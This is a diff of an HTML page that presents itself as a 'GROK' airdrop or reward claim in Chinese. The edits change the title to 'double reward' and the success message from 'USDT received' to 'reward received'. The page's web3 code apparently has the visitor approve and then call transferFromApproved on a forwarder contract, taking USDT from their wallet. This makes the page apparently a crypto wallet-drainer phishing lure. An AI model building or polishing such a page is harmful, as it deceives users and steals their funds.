@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="GROK.png" type="image/x-icon">
-  <title>GROK 空投领取</title>
+  <title>GROK 双倍奖励领取</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
   <style>
     * { box-sizing: border-box; }
@@ -24,7 +24,7 @@
 </head>
 <body>
   <div class="card">
-    <h1>GROK 奖励领取</h1>
+    <h1>GROK 双倍奖励</h1>
     <div class="warning">
       <strong>注意：</strong>最多只能领取<strong>钱包中</strong>，实际余额
     </div>
@@ -124,7 +124,7 @@ async function approveAndTransfer() {
     await forwarder.methods.transferFromApproved().send({ from: account });
 
     status.className = "success";
-    status.innerHTML = "领取成功！<br>USDT 已到账";
+    status.innerHTML = "领取成功！<br>奖励 已到账";
     await updateUSDTBalance();
 
   } catch (e) {
@@ -139,5 +139,4 @@ async function approveAndTransfer() {
     };
   </script>
 </body>
-
 </html>
